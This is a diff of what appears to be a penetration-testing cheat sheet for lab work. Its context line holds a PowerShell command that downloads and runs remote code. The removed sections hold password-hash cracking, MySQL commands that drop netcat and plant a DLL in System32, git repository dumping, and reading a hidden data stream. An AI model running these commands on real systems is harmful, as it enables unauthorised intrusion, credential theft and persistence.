@@ -595,23 +595,6 @@ powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://1
 
 ```
 
-## kdbx and KPCLI
-```bash
-keepass2john Database.kdbx > keepass.hash
-hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt --force 
-
-sudo apt install kpcli
-kpcli --kdb=Database.kdbx
-show -f 2
-```
-
-## JohnTheRipper
-```bash
-# Display already discovered hash
-john hashname --show
-
-```
-
 ## cross compiliation
 ```bash
 sudo apt install mingw-w64
@@ -620,41 +603,6 @@ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
 
 x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
 ```
-
-## Git
-```bash
-git-dumper http://192.168.234.144:80/.git ./gitdumps 
-```
-
-## zip
-```bash
-First check manually if it's password protected or not
-zip2john sitebackup3.zip > zip.hash
-```
-
-
-## MYSQL
-```bash
-mysql -u root -h 127.0.0.1
-select load_file('C:\\test\\nc.exe') into dumpfile 'C:\\test\\shell.exe';
-select load_file('C:\\test\\phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll";
-```
-
-## proof.txt
-```bash
-# When we have a random txt file instead of proof.txt
-PS C:\Users\Administrator\Desktop> Get-Item -path hm.txt -stream *
-
-FileName: C:\Users\Administrator\Desktop\hm.txt
-
-Stream                   Length
-------                   ------
-:$DATA                       36
-root.txt                     34
-
-Get-Content -path hm.txt -stream root.txt
-```
-
 
 ## Bloodhound-python
 ```bash
